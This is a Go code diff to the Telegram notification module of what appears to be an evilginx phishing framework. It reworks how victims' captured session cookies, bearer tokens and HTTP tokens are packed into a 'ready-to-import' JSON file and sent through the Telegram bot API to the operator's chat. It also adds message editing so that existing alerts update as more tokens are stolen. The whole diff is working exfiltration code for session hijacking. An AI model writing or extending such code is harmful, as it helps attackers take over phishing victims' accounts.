@@ -27,9 +27,20 @@ type TelegramMessage struct {
 	ParseMode string `json:"parse_mode"`
 }
 
+type TelegramEditMessage struct {
+	ChatId    string `json:"chat_id"`
+	MessageId int    `json:"message_id"`
+	Text      string `json:"text"`
+	ParseMode string `json:"parse_mode"`
+}
+
 type TelegramResponse struct {
-	Ok     bool   `json:"ok"`
-	Result string `json:"result"`
+	Ok     bool                   `json:"ok"`
+	Result TelegramMessageResult `json:"result"`
+}
+
+type TelegramMessageResult struct {
+	MessageId int `json:"message_id"`
 }
 
 type TelegramDocument struct {
@@ -38,43 +49,39 @@ type TelegramDocument struct {
 	ParseMode string `json:"parse_mode"`
 }
 
-type SessionExport struct {
-	SessionInfo   SessionInfo            `json:"session_info"`
-	Credentials   CredentialsInfo        `json:"credentials"`
-	AuthTokens    AuthTokensInfo         `json:"auth_tokens"`
-	CustomFields  map[string]string      `json:"custom_fields"`
-	ExportTime    string                 `json:"export_time"`
+type TelegramDocumentResponse struct {
+	Ok     bool                       `json:"ok"`
+	Result TelegramDocumentResult     `json:"result"`
 }
 
-type SessionInfo struct {
-	SessionID    string `json:"session_id"`
-	SessionIndex int    `json:"session_index"`
-	Phishlet     string `json:"phishlet"`
-	IPAddress    string `json:"ip_address"`
-	UserAgent    string `json:"user_agent"`
-	Timestamp    string `json:"timestamp"`
+type TelegramDocumentResult struct {
+	MessageId int                    `json:"message_id"`
+	Document  TelegramDocumentInfo   `json:"document"`
 }
 
-type CredentialsInfo struct {
-	Username string `json:"username"`
-	Password string `json:"password"`
+type TelegramDocumentInfo struct {
+	FileId   string `json:"file_id"`
+	FileName string `json:"file_name"`
 }
 
-type AuthTokensInfo struct {
-	CookieTokens map[string]map[string]TokenInfo `json:"cookie_tokens"`
-	BodyTokens   map[string]string               `json:"body_tokens"`
-	HttpTokens   map[string]string               `json:"http_tokens"`
+// Ready-to-import format - contains only tokens, no session info or credentials
+type TokensExport struct {
+	SessionID     string                          `json:"session_id"`
+	Phishlet      string                          `json:"phishlet"`
+	LastUpdated   string                          `json:"last_updated"`
+	TokenCount    int                             `json:"token_count"`
+	CookieTokens  map[string]map[string]CookieData `json:"cookies"`
+	BearerTokens  map[string]string               `json:"bearer_tokens"`
+	HttpTokens    map[string]string               `json:"http_tokens"`
 }
 
-type TokenInfo struct {
-	Name      string `json:"name"`
-	Value     string `json:"value"`
-	Domain    string `json:"domain"`
-	Path      string `json:"path"`
-	HttpOnly  bool   `json:"http_only"`
-	Secure    bool   `json:"secure"`
-	SameSite  string `json:"same_site"`
-	ExpiresAt string `json:"expires_at"`
+// Simplified cookie data for import
+type CookieData struct {
+	Name     string `json:"name"`
+	Value    string `json:"value"`
+	Domain   string `json:"domain"`
+	Path     string `json:"path,omitempty"`
+	HttpOnly bool   `json:"httponly,omitempty"`
 }
 
 func NewTelegramBot() *TelegramBot {
@@ -92,64 +99,130 @@ func (t *TelegramBot) SendSessionNotification(session *Session, sessionIndex int
 		return fmt.Errorf("telegram bot token or chat ID not configured")
 	}
 
-	// Enhanced logging for debugging
-	log.Debug("telegram: checking session data for notification")
-	log.Debug("telegram: session username: '%s'", session.Username)
-	log.Debug("telegram: session password: '%s'", session.Password)
-	log.Debug("telegram: cookie tokens: %d", len(session.CookieTokens))
-	log.Debug("telegram: body tokens: %d", len(session.BodyTokens))
-	log.Debug("telegram: http tokens: %d", len(session.HttpTokens))
-
-	// Check if session has meaningful data - made less restrictive
+	// Check if session has meaningful data
 	if !t.hasValidSessionData(session) {
-		log.Warning("telegram: skipping notification for session %d - no meaningful data captured", sessionIndex)
-		log.Debug("telegram: session details - username: '%s', password: '%s', cookies: %d, body: %d, http: %d", 
-			session.Username, session.Password, len(session.CookieTokens), len(session.BodyTokens), len(session.HttpTokens))
+		log.Debug("telegram: skipping notification for session %d - no meaningful data", sessionIndex)
 		return nil
 	}
 
-	log.Info("telegram: sending notification for session %d", sessionIndex)
-
-	// Check if we have auth tokens to send as JSON file
+	// Check if we have auth tokens
 	hasAuthTokens := len(session.CookieTokens) > 0 || len(session.BodyTokens) > 0 || len(session.HttpTokens) > 0
 	
-	if hasAuthTokens {
-		// Create JSON export file
-		jsonFile, err := t.createSessionExportFile(session, sessionIndex, phishletName, cfgDir)
-		if err != nil {
-					log.Error("telegram: failed to create JSON export: %v", err)
-		// Fall back to text message only
-		message := t.formatSessionMessage(session, sessionIndex, phishletName)
-		return t.sendMessage(message)
-		}
-		
-		// Send document with auth tokens
-		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
-		err = t.sendDocument(jsonFile, caption)
-		if err != nil {
-					log.Error("telegram: failed to send document: %v", err)
-		// Fall back to text message only
-		message := t.formatSessionMessage(session, sessionIndex, phishletName)
-		return t.sendMessage(message)
-		}
-		
-		// Clean up temporary file
-		defer os.Remove(jsonFile)
-		
-		log.Success("telegram: notification with JSON file sent successfully for session %d", sessionIndex)
-		return nil
+	// Determine if this is initial notification or update
+	if !session.TelegramNotified {
+		// First time notification
+		return t.sendInitialNotification(session, sessionIndex, phishletName, cfgDir, hasAuthTokens)
 	} else {
-		// No auth tokens, send regular text message
-		message := t.formatSessionMessage(session, sessionIndex, phishletName)
-		err := t.sendMessage(message)
+		// Update existing notification
+		return t.updateExistingNotification(session, sessionIndex, phishletName, cfgDir, hasAuthTokens)
+	}
+}
+
+func (t *TelegramBot) sendInitialNotification(session *Session, sessionIndex int, phishletName string, cfgDir string, hasAuthTokens bool) error {
+	log.Info("telegram: sending initial notification for session %d", sessionIndex)
+	
+	if hasAuthTokens {
+		// Create and send JSON file with message
+		jsonFile, err := t.createTokensExportFile(session, sessionIndex, phishletName, cfgDir)
 		if err != nil {
-			log.Error("telegram: failed to send notification: %v", err)
+			log.Error("telegram: failed to create tokens file: %v", err)
+			// Fall back to message only
+			return t.sendInitialMessage(session, sessionIndex, phishletName)
+		}
+		
+		caption := t.formatSessionCaption(session, sessionIndex, phishletName)
+		messageId, fileId, err := t.sendDocumentWithIds(jsonFile, caption)
+		if err != nil {
+			log.Error("telegram: failed to send document: %v", err)
+			os.Remove(jsonFile)
+			return t.sendInitialMessage(session, sessionIndex, phishletName)
+		}
+		
+		// Store IDs for future updates
+		session.TelegramMessageID = messageId
+		session.TelegramFileID = fileId
+		session.TelegramNotified = true
+		
+		os.Remove(jsonFile)
+		log.Success("telegram: initial notification with JSON sent for session %d", sessionIndex)
+		
+	} else {
+		// Send message only
+		return t.sendInitialMessage(session, sessionIndex, phishletName)
+	}
+	
+	return nil
+}
+
+func (t *TelegramBot) sendInitialMessage(session *Session, sessionIndex int, phishletName string) error {
+	message := t.formatSessionMessage(session, sessionIndex, phishletName)
+	messageId, err := t.sendMessageWithId(message)
+	if err != nil {
+		log.Error("telegram: failed to send message: %v", err)
+		return err
+	}
+	
+	session.TelegramMessageID = messageId
+	session.TelegramNotified = true
+	
+	log.Success("telegram: initial message sent for session %d", sessionIndex)
+	return nil
+}
+
+func (t *TelegramBot) updateExistingNotification(session *Session, sessionIndex int, phishletName string, cfgDir string, hasAuthTokens bool) error {
+	log.Info("telegram: updating notification for session %d", sessionIndex)
+	
+	if hasAuthTokens && session.TelegramFileID != "" {
+		// Update both message and JSON file
+		err := t.updateMessageAndFile(session, sessionIndex, phishletName, cfgDir)
+		if err != nil {
+			log.Error("telegram: failed to update message and file: %v", err)
 			return err
 		}
-		
-		log.Success("telegram: notification sent successfully for session %d", sessionIndex)
+	} else if session.TelegramMessageID > 0 {
+		// Update message only
+		err := t.updateMessage(session, sessionIndex, phishletName)
+		if err != nil {
+			log.Error("telegram: failed to update message: %v", err)
+			return err
+		}
+	}
+	
+	log.Success("telegram: notification updated for session %d", sessionIndex)
+	return nil
+}
+
+func (t *TelegramBot) updateMessageAndFile(session *Session, sessionIndex int, phishletName string, cfgDir string) error {
+	// Create updated JSON file
+	jsonFile, err := t.createTokensExportFile(session, sessionIndex, phishletName, cfgDir)
+	if err != nil {
+		return fmt.Errorf("failed to create updated tokens file: %v", err)
+	}
+	defer os.Remove(jsonFile)
+	
+	// Update message caption
+	caption := t.formatSessionCaption(session, sessionIndex, phishletName)
+	err = t.editMessage(session.TelegramMessageID, caption)
+	if err != nil {
+		log.Warning("telegram: failed to edit message, trying to send new one: %v", err)
+		// Fallback: send new document
+		messageId, fileId, err := t.sendDocumentWithIds(jsonFile, caption)
+		if err != nil {
+			return err
+		}
+		session.TelegramMessageID = messageId
+		session.TelegramFileID = fileId
 		return nil
 	}
+	
+	// Note: Telegram doesn't allow editing document files, so we keep the original file
+	// The updated data is reflected in the message caption
+	return nil
+}
+
+func (t *TelegramBot) updateMessage(session *Session, sessionIndex int, phishletName string) error {
+	message := t.formatSessionMessage(session, sessionIndex, phishletName)
+	return t.editMessage(session.TelegramMessageID, message)
 }
 
 func (t *TelegramBot) hasValidSessionData(session *Session) bool {
@@ -250,64 +323,178 @@ func (t *TelegramBot) Test() error {
 	return t.sendMessage(testMessage)
 }
 
-func (t *TelegramBot) createSessionExportFile(session *Session, sessionIndex int, phishletName string, cfgDir string) (string, error) {
-	// Create export data structure
-	exportData := SessionExport{
-		SessionInfo: SessionInfo{
-			SessionID:    session.Id,
-			SessionIndex: sessionIndex,
-			Phishlet:     phishletName,
-			IPAddress:    session.RemoteAddr,
-			UserAgent:    session.UserAgent,
-			Timestamp:    time.Now().Format("2006-01-02 15:04:05"),
-		},
-		Credentials: CredentialsInfo{
-			Username: session.Username,
-			Password: session.Password,
-		},
-		AuthTokens: AuthTokensInfo{
-			CookieTokens: make(map[string]map[string]TokenInfo),
-			BodyTokens:   session.BodyTokens,
-			HttpTokens:   session.HttpTokens,
-		},
-		CustomFields: session.Custom,
-		ExportTime:   time.Now().Format("2006-01-02 15:04:05"),
+func (t *TelegramBot) sendMessageWithId(message string) (int, error) {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.BotToken)
+	
+	telegramMsg := TelegramMessage{
+		ChatId:    t.ChatId,
+		Text:      message,
+		ParseMode: "Markdown",
 	}
 	
-	// Convert cookie tokens to exportable format
+	jsonData, err := json.Marshal(telegramMsg)
+	if err != nil {
+		return 0, fmt.Errorf("failed to marshal telegram message: %v", err)
+	}
+	
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return 0, fmt.Errorf("failed to send telegram message: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return 0, fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
+	}
+	
+	var response TelegramResponse
+	err = json.NewDecoder(resp.Body).Decode(&response)
+	if err != nil {
+		return 0, fmt.Errorf("failed to decode telegram response: %v", err)
+	}
+	
+	if !response.Ok {
+		return 0, fmt.Errorf("telegram API returned error")
+	}
+	
+	return response.Result.MessageId, nil
+}
+
+func (t *TelegramBot) editMessage(messageId int, text string) error {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageText", t.BotToken)
+	
+	editMsg := TelegramEditMessage{
+		ChatId:    t.ChatId,
+		MessageId: messageId,
+		Text:      text,
+		ParseMode: "Markdown",
+	}
+	
+	jsonData, err := json.Marshal(editMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal edit message: %v", err)
+	}
+	
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return fmt.Errorf("failed to send edit request: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
+	}
+	
+	return nil
+}
+
+func (t *TelegramBot) sendDocumentWithIds(filePath string, caption string) (int, string, error) {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.BotToken)
+	
+	file, err := os.Open(filePath)
+	if err != nil {
+		return 0, "", fmt.Errorf("failed to open file: %v", err)
+	}
+	defer file.Close()
+	
+	var requestBody bytes.Buffer
+	writer := multipart.NewWriter(&requestBody)
+	
+	writer.WriteField("chat_id", t.ChatId)
+	writer.WriteField("caption", caption)
+	writer.WriteField("parse_mode", "Markdown")
+	
+	part, err := writer.CreateFormFile("document", filepath.Base(filePath))
+	if err != nil {
+		return 0, "", fmt.Errorf("failed to create form file: %v", err)
+	}
+	
+	_, err = io.Copy(part, file)
+	if err != nil {
+		return 0, "", fmt.Errorf("failed to copy file: %v", err)
+	}
+	
+	writer.Close()
+	
+	req, err := http.NewRequest("POST", url, &requestBody)
+	if err != nil {
+		return 0, "", fmt.Errorf("failed to create request: %v", err)
+	}
+	
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+	
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return 0, "", fmt.Errorf("failed to send document: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	if resp.StatusCode != http.StatusOK {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return 0, "", fmt.Errorf("telegram API error (status %d): %s", resp.StatusCode, string(body))
+	}
+	
+	var response TelegramDocumentResponse
+	err = json.NewDecoder(resp.Body).Decode(&response)
+	if err != nil {
+		return 0, "", fmt.Errorf("failed to decode document response: %v", err)
+	}
+	
+	if !response.Ok {
+		return 0, "", fmt.Errorf("telegram API returned error")
+	}
+	
+	return response.Result.MessageId, response.Result.Document.FileId, nil
+}
+
+func (t *TelegramBot) createTokensExportFile(session *Session, sessionIndex int, phishletName string, cfgDir string) (string, error) {
+	// Create tokens-only export data
+	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
+	
+	exportData := TokensExport{
+		SessionID:     session.Id,
+		Phishlet:      phishletName,
+		LastUpdated:   time.Now().Format("2006-01-02 15:04:05"),
+		TokenCount:    tokenCount,
+		CookieTokens:  make(map[string]map[string]CookieData),
+		BearerTokens:  session.BodyTokens,
+		HttpTokens:    session.HttpTokens,
+	}
+	
+	// Convert cookie tokens to simplified format
 	for domain, cookies := range session.CookieTokens {
-		exportData.AuthTokens.CookieTokens[domain] = make(map[string]TokenInfo)
+		exportData.CookieTokens[domain] = make(map[string]CookieData)
 		for name, cookie := range cookies {
-					exportData.AuthTokens.CookieTokens[domain][name] = TokenInfo{
-			Name:      name,
-			Value:     cookie.Value,
-			Domain:    domain,
-			Path:      cookie.Path,
-			HttpOnly:  cookie.HttpOnly,
-			Secure:    false, // Not available in CookieToken
-			SameSite:  "",    // Not available in CookieToken
-			ExpiresAt: "",    // Not available in CookieToken
-		}
+			exportData.CookieTokens[domain][name] = CookieData{
+				Name:     name,
+				Value:    cookie.Value,
+				Domain:   domain,
+				Path:     cookie.Path,
+				HttpOnly: cookie.HttpOnly,
+			}
 		}
 	}
 	
 	// Convert to JSON
 	jsonData, err := json.MarshalIndent(exportData, "", "  ")
 	if err != nil {
-		return "", fmt.Errorf("failed to marshal session data: %v", err)
+		return "", fmt.Errorf("failed to marshal tokens data: %v", err)
 	}
 	
-	// Create temp file
+	// Create temp file with meaningful name
 	tempDir := os.TempDir()
-	filename := fmt.Sprintf("evilginx_session_%d_%s_%d.json", sessionIndex, phishletName, time.Now().Unix())
+	filename := fmt.Sprintf("session_%d_tokens_%s.json", sessionIndex, phishletName)
 	filePath := filepath.Join(tempDir, filename)
 	
 	err = ioutil.WriteFile(filePath, jsonData, 0600)
 	if err != nil {
-		return "", fmt.Errorf("failed to write JSON file: %v", err)
+		return "", fmt.Errorf("failed to write tokens file: %v", err)
 	}
 	
-	log.Debug("telegram: created JSON export file: %s", filePath)
+	log.Debug("telegram: created tokens export file: %s", filePath)
 	return filePath, nil
 }
 
